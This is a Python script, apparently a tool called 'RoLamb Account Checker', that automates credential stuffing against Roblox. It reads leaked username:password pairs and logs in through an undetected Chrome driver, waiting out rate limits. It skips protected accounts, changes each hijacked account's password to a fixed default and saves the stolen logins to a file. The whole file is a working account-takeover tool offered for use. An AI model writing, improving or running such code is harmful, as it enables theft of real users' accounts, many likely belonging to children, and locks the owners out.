import time, os, ctypes, threading
import random

# design
from rich import print

# selenium
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By

senhapadrao = "senha_padrao"
validos = 0
invalidos = 0
contas = 0

def Logger(text, type):
    global validos, invalidos, contas
    if(type == 0): # fatal
        print(f'[red bold](\U0001F480) {text}[/red bold]')
        invalidos = invalidos+1
    if(type == 1): # good
        print(f'[green bold](\U0001F49C) {text}[/green bold]')
        validos = validos+1
    if(type == 2): # log
        print(f'[white bold](\U0001F939) {text}[/white bold]')

def LogarConta(username, password):
    global validos, invalidos, contas
    contas = contas+1

    ContaEntrou = False
    elapsed_time = 0

    # configurar selenium
    options = uc.ChromeOptions()
    options.headless = False
    
    options.add_argument("--incognito")

    driver = uc.Chrome(
        use_subprocess=True,
        options=options,
    )
    driver.set_window_size(800, 800)
    driver.set_window_position(0, 0)
    driver.get("https://www.roblox.com/pt/my/account#!/info")
    time.sleep(1)

    # inputs
    username_input = driver.find_element(By.ID, "login-username")
    pwd_input = driver.find_element(By.ID, "login-password")
    login_button = driver.find_element(By.ID, "login-button")

    username_input.clear()
    pwd_input.clear()

    Logger("Inserindo ...", 2)
    
    username_input.send_keys(str(username))
    pwd_input.send_keys(str(password))

    login_button.click()
    time.sleep(1)


    try:
        driver.find_element("id", "GeneralErrorText")
        driver.quit()
        
        for i in range(360):
            print(f"Limit reached, waiting... {i+1}/{360}")
            time.sleep(1)
    except:
        pass

    # verificar cookies
    while not ContaEntrou and elapsed_time < 180:
        try:
            driver.find_element("id", "login-form-error")
            driver.quit()
            Logger('Senha incorreta', 0)
            break
        except:

            # verificar erros
            try:
                driver.find_element(By.ID, 'two-step-verification-code-input')
                driver.quit()
                Logger('A conta tem email de recuperacao', 0)
                
                break
            except:
                pass

            try:
                driver.find_element(By.XPATH, '//*[@id="form-forgot-credentials"]/div[2]/div[1]/div')
                driver.find_element(By.ID, 'email')
                driver.quit()
                Logger('A conta tem email de recuperacao', 0)
                
                break
            except:
                pass

            try:
                driver.find_element(By.XPATH, '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[2]/button')
                driver.quit()
                Logger('A conta tem autentificacao de 2 fatores', 0)
                
                break
            except:
                pass

            '''
            try:
                driver.find_element(By.XPATH, '//*[@id="account-security-prompt-container"]/div/div/div[1]/div[1]/div')
                driver.quit()
                Logger('A senha da conta nao pode ser alterada', 0)
                
                break
            except:
                pass
            '''

            time.sleep(1)
            elapsed_time += 1
            for cookie in driver.get_cookies():
                if cookie.get('name') == '.ROBLOSECURITY':
                    ContaEntrou = True
                    break

    if ContaEntrou: # trocar a senha agora
        Logger('(Trocar a senha) -> Sendo Iniciada..', 2)
        time.sleep(1.3)

        MudouASenha = False
        try:
            try:
                driver.find_element(By.ID, '//*[@id="user-agreements-checker-modal"]/div/div/div[3]/div[2]/button').click()        
            except:
                pass

            driver.find_element(By.XPATH, '//*[@id="account-security-prompt-container"]/div/div/div[1]/div[1]/div')
            Logger('(Trocar a senha \'block\') -> Ativada!', 2)
            
            driver.find_element(By.XPATH, '//*[@id="account-security-prompt-container"]/div/div/div[2]/span/button').click()
            time.sleep(0.8)
            driver.find_element(By.XPATH, '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[3]/div/button').click()
            time.sleep(1)
            
            oldpwn_btn = driver.find_element(By.XPATH, '//*[@id="inputCurrentPassword"]')
            newpwn_btn = driver.find_element(By.XPATH, '//*[@id="inputNewPassword"]')
            conpwn_btn = driver.find_element(By.XPATH, '//*[@id="inputNewPasswordAgain"]')

            oldpwn_btn.clear()
            newpwn_btn.clear()
            conpwn_btn.clear()

            time.sleep(0.1)
            oldpwn_btn.send_keys(str(password))
            newpwn_btn.send_keys(str(senhapadrao))
            conpwn_btn.send_keys(str(senhapadrao))

            time.sleep(0.5)
            driver.find_element(By.XPATH, '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[3]/div/button').click()
            time.sleep(1)

            ff = open('account-checker/minhascontas.txt', 'a')
            ff.write(f'{username}:{senhapadrao}' + '\n')
            ff.close()

            ctypes.windll.kernel32.SetConsoleTitleW(f">> +1 Contas Valida! Total: [{validos}] <<")
            Logger('Sucesso! Conta foi insirida em [white u]minhascontas.txt[/white u]', 1)

            MudouASenha = True
            driver.quit()
        except:
            pass
            
        while not MudouASenha:
            try:
                driver.find_element(By.ID, '//*[@id="user-agreements-checker-modal"]/div/div/div[3]/div[2]/button').click()        
            except:
                pass

            Logger('Iniciando a troca da senha..', 2)
            #key_button = driver.find_element(By.XPATH, '//*[@id="account-change-password"]/span')
            key_button = driver.find_element(By.XPATH, '//*[@id="account-change-password"]')
            time.sleep(1.5)

            key_button.click()
            time.sleep(1)

            oldpwn_btn = driver.find_element(By.ID, "old-password-text-box")
            newpwn_btn = driver.find_element(By.ID, "new-password-text-box")
            conpwn_btn = driver.find_element(By.ID, "confirm-password-text-box")
            atualizarpwn_btn = driver.find_element(By.XPATH, '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[3]/button')

            oldpwn_btn.clear()
            newpwn_btn.clear()
            conpwn_btn.clear()

            oldpwn_btn.send_keys(str(password))
            newpwn_btn.send_keys(str(senhapadrao))
            conpwn_btn.send_keys(str(senhapadrao))

            time.sleep(0.5)
            atualizarpwn_btn.click()
            time.sleep(1)

            ff = open('account-checker/minhascontas.txt', 'a')
            ff.write(f'\n{username}:{senhapadrao}')
            ff.close()

            ctypes.windll.kernel32.SetConsoleTitleW(f">> +1 Contas Valida! Total: [{validos}] <<")
            Logger('Sucesso! Conta foi insirida em [white u]minhascontas.txt[/white u]', 1)

            MudouASenha = True

            time.sleep(1)
        driver.quit()
        
def main():
    global contas, invalidos, validos
    ctypes.windll.kernel32.SetConsoleTitleW(f"[RoLamb Account Checker]: Carregando..")
    
    with open('account-checker/contas.txt', 'r') as file:
        for line in file:
            try:
                account = line.strip()
                if(int(len(account)) != 0):
                    username = account.split(":")[0]
                    password = account.split(":")[1]

                    if(username != 'username'):
                        #ff = open('account-checker/tentativas_conta.txt', 'a')
                        #ff.write(f'{username}:{password}' + '\n')
                        #ff.close()

                        print('____________________________________________________________________________________')
                        Logger(f'Iniciando o Login -> [bright_green u]{account}[/bright_green u]', 2)
                        LogarConta(username, password)
                        ctypes.windll.kernel32.SetConsoleTitleW(f"[Total: {contas}] - [✅:{validos}] - [❌:{invalidos}]")
            except:
                pass


    '''
    username = sys.argv[1].split(":")[0]
    password = sys.argv[1].split(":")[1]
    '''

if __name__ == "__main__":
    os.system('cls')
    logo = '''[bright_green]

 ▄▄▄       ▄████▄   ▄████▄      ██▒   █▓ ██▓ ██▀███    ▄████ ▓█████  ███▄ ▄███▓
▒████▄    ▒██▀ ▀█  ▒██▀ ▀█     ▓██░   █▒▓██▒▓██ ▒ ██▒ ██▒ ▀█▒▓█   ▀ ▓██▒▀█▀ ██▒
▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄     ▓██  █▒░▒██▒▓██ ░▄█ ▒▒██░▄▄▄░▒███   ▓██    ▓██░
░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒     ▒██ █░░░██░▒██▀▀█▄  ░▓█  ██▓▒▓█  ▄ ▒██    ▒██ 
 ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░      ▒▀█░  ░██░░██▓ ▒██▒░▒▓███▀▒░▒████▒▒██▒   ░██▒
 ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░      ░ ▐░  ░▓  ░ ▒▓ ░▒▓░ ░▒   ▒ ░░ ▒░ ░░ ▒░   ░  ░
  ▒   ▒▒ ░  ░  ▒     ░  ▒         ░ ░░   ▒ ░  ░▒ ░ ▒░  ░   ░  ░ ░  ░░  ░      ░
  ░   ▒   ░        ░                ░░   ▒ ░  ░░   ░ ░ ░   ░    ░   ░      ░   
      ░  ░░ ░      ░ ░               ░   ░     ░           ░    ░  ░       ░   
          ░        ░                ░                                          

[white bold](*)[/white bold][white] Lista de Contas Verificadas ficarao em [bright_green u]minhascontas.txt[/bright_green u]
[white bold](*)[/white bold][white] Lembre-se de trocar a [bright_green u]SENHA PADRAO[/bright_green u]

Iniciando...
'''
    print(logo)
    input('>>> Hello Friend!')
    #main()

    processes = [] 
    ps = threading.Thread(target=main)
    ps.start() 
    processes.append(ps)        
    for ps in processes:
        ps.join()

    print(f"\n\n\n\n_______________________________________________________________________________________")
    print(f"Contas Verificadas: {contas}")
    print(f"Contas ganhas: [bright_green b u]{validos}[/bright_green b u] de [pink b u]{contas-invalidos}[/pink b u] contas")
    print(f"Contas Invalidas: [red u b]{invalidos}[/red u b]")
    input()

    